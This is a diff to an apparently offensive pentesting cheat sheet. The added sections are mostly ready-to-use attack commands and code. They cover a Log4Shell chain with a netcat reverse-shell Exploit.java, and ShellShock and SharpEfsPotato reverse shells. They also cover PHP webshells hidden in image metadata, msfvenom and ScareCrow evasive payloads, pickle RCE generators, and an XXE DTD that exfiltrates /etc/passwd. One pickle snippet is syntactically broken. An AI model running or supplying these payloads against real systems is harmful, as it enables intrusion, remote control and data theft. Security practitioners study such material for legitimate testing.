@@ -1935,7 +3405,7 @@ msf6 exploit(multi/handler) > run
 ```
 
 ```c
-C:\> .\exploit.exe
+.\exploit.exe
 ```
 
 ```c
@@ -1943,15 +3413,153 @@ C:\> .\exploit.exe
 [*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
 ```
 
-#### SharpEfsPotato
-
-> https://github.com/bugch3ck/SharpEfsPotato
+#### Log4j / Log4Shell (CVE-2021-44228)
 
 ```c
-PS C:\> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
+cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
+```
+
+##### Preparation
+
+> http://mirrors.rootpei.com/jdk/
+
+File: jdk-8u181-linux-x64.tar.gz
+
+##### Creating Library Folder
+
+```c
+sudo mkdir /usr/lib/jvm
+cd /usr/lib/jvm
+sudo tar xzvf /usr/lib/jvm/jdk-8u181-linux-x64.tar.gz
+sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
+sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
+sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1
+sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
+sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
+sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws
+```
+
+##### Verify Version
+
+```c
+java -version
+```
+
+##### Get Exploit Framework
+
+```c
+git clone https://github.com/mbechler/marshalsec
+cd /opt/08_exploitation_tools/marshalsec/
+sudo apt-get install maven
+mvn clean package -DskipTests
+```
+
+##### Exploit.java
+
+```c
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <LHOST> <LPORT>");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+##### Compiling Exploit.java
+
+```c
+javac Exploit.java -source 8 -target 8
+```
+
+##### Start Pyhton3 HTTP Server
+
+```c
+python3 -m http.server 80
+```
+
+##### Starting the malicious LDAP Server
+
+```c
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<LHOST>:80/#Exploit"
+```
+
+##### Start local netcat listener
+
+```c
+nc -lnvp 9001
+```
+
+##### Execute the Payload
+
+```c
+curl 'http://<RHOST>:8983/solr/admin/cores?foo=$\{jndi:ldap://<LHOST>:1389/Exploit\}'
+```
+
+#### SharpEfsPotato
+
+```c
+SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
+```
+
+#### ShellShock
+
+```c
+curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
+```
+
+#### Shocker
+
+> https://raw.githubusercontent.com/gabrtv/shocker/master/shocker.c
+
+```c
+        // get a FS reference from something mounted in from outside
+        if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
+                die("[-] open");
+
+        if (find_handle(fd1, "/root/root.txt", &root_h, &h) <= 0)
+                die("[-] Cannot find valid handle!");
+```
+
+```c
+gcc shocker.c -o shocker
+cc -Wall -std=c99 -O2 shocker.c -static
 ```
 
 ### Payloads
+
+#### Donut
+
+```c
+donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
+```
+
+#### Exiftool
+
+##### PHP into JPG Injection
+
+```c
+exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg
+exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' <FILE>.jpeg
+exiftool "-comment<=back.php" back.png
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' <FILE>.png
+```
+
+#### GhostScript
+
+```c
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%cat flag > /app/application/static/petpets/flag.txt) currentdevice putdeviceprops
+```
 
 #### Reverse Shells
 
@@ -2170,6 +3778,68 @@ Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
 powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
 ```
 
+#### ScareCrow
+
+##### Payloads
+
+###### Shellcode Payload Creation with msfvenom
+
+```c
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
+```
+
+###### .msi-File Payload Creation with msfvenom
+
+```c
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
+```
+
+##### Listener
+
+```c
+msf6 > use exploit/multi/handler
+msf6 > set payload windows/x64/meterpreter/reverse_https
+```
+
+##### Obfuscation
+
+###### DLL Side-Loading
+
+```c
+ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
+```
+###### Windows Script Host
+
+```c
+ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
+```
+
+###### Control Panel Files
+
+```c
+ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
+```
+
+##### Renaming Payload
+
+```c
+mv <FILE>.dll <FILE>32.dll
+```
+
+##### Execution
+
+```c
+rundll32.exe .\<FILE>32.dll,DllRegisterServer
+```
+
+or
+
+```c
+regsvr32 /s .\<FILE>32.dll
+```
+
+For `.cpl-Files` a simple double click is enough to execute them.
+
 #### Shikata Ga Nai
 
 ```c
@@ -2274,51 +3944,147 @@ Connection: close
 }
 ```
 
-#### XSS
+#### Python Pickle RCE
 
-##### Basic Payloads
+```python
+import pickle
+import sys
+import base64
 
-```c
-<script>alert('XSS')</script>
-<scr<script>ipt>alert('XSS')</scr<script>ipt>
-"><script>alert('XSS')</script>
-"><script>alert(String.fromCharCode(88,83,83))</script>
-<script src="http://<LHOST>/<FILE>"></script>
+command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> <LHOST> > /tmp/f'
+
+class rce(object):
+    def __reduce__(self):
+        import os
+        return (os.system,(command,))
+
+print(base64.b64encode(pickle.dumps(rce())))
 ```
 
-##### IMG Payloads
+```python
+import base64
+import pickle
+import os
 
-```c
-<img src=x onerror=alert('XSS');>
-<img src=x onerror=alert('XSS')//
-<img src=x onerror=alert(String.fromCharCode(88,83,83));>
-<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
-<img src=x:alert(alt) onerror=eval(src) alt=xss>
-"><img src=x onerror=alert('XSS');>
-"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+class RCE:
+	def __reduce__(self):
+		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
+		return = os.system, (cmd, )
+
+if __name__ == '__main__':
+	pickle = pickle.dumps(RCE())
+	print(bas64.b64encode(pickled))
 ```
 
-##### SVG Payloads
+#### Python Redirect for SSRF
 
-```c
-<svgonload=alert(1)>
-<svg/onload=alert('XSS')>
-<svg onload=alert(1)//
-<svg/onload=alert(String.fromCharCode(88,83,83))>
-<svg id=alert(1) onload=eval(id)>
-"><svg/onload=alert(String.fromCharCode(88,83,83))>
-"><svg/onload=alert(/XSS/)
-<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+```python
+#!/usr/bin/python3
+import sys
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class Redirect(BaseHTTPRequestHandler):
+  def do_GET(self):
+      self.send_response(302)
+      self.send_header('Location', sys.argv[1])
+      self.end_headers()
+
+HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
 ```
 
-##### DIV Payloads
+```c
+sudo python3 redirect.py http://127.0.0.1:3000/
+```
+
+```python
+#!/usr/bin/env python
+
+import SimpleHTTPServer
+import SocketServer
+import sys
+import argparse
+
+def redirect_handler_factory(url):
+    """
+    returns a request handler class that redirects to supplied `url`
+    """
+    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+       def do_GET(self):
+           self.send_response(301)
+           self.send_header('Location', url)
+           self.end_headers()
+
+       def do_POST(self):
+           self.send_response(301)
+           self.send_header('Location', url)
+           self.end_headers()
+
+    return RedirectHandler
+
+
+def main():
+
+    parser = argparse.ArgumentParser(description='HTTP redirect server')
+
+    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
+    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
+    parser.add_argument('redirect_url', action="store")
+
+    myargs = parser.parse_args()
+
+    redirect_url = myargs.redirect_url
+    port = myargs.port
+    host = myargs.ip
+
+    redirectHandler = redirect_handler_factory(redirect_url)
+
+    handler = SocketServer.TCPServer((host, port), redirectHandler)
+    print("serving at port %s" % port)
+    handler.serve_forever()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Python Web Request
+
+```python
+import requests
+import re
+
+http_proxy  = "http://127.0.0.1:8080"
+proxyDict = {
+              "http"  : http_proxy,
+            }
+// get a session
+r = requests.get('http://')
+// send request
+r = requests.post('<RHOST>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
+```
+
+#### XML External Entity (XXE)
+
+##### Request
 
 ```c
-<div onpointerover="alert(45)">MOVE HERE</div>
-<div onpointerdown="alert(45)">MOVE HERE</div>
-<div onpointerenter="alert(45)">MOVE HERE</div>
-<div onpointerleave="alert(45)">MOVE HERE</div>
-<div onpointermove="alert(45)">MOVE HERE</div>
-<div onpointerout="alert(45)">MOVE HERE</div>
-<div onpointerup="alert(45)">MOVE HERE</div>
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % <NAME> SYSTEM 
+"http://<LHOST>/<FILE>.dtd">%<NAME>;]>
+<root>
+<method>GET</method>
+<uri>/</uri>
+<user>
+<username><NAME>;</username>
+<password><NAME></password>
+</user>
+</root>
+```
+
+##### Content of <FILE>.dtd
+
+```c
+<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<LHOST>/?f=%file;'>">
+%eval;
+%exfiltrate;
 ```
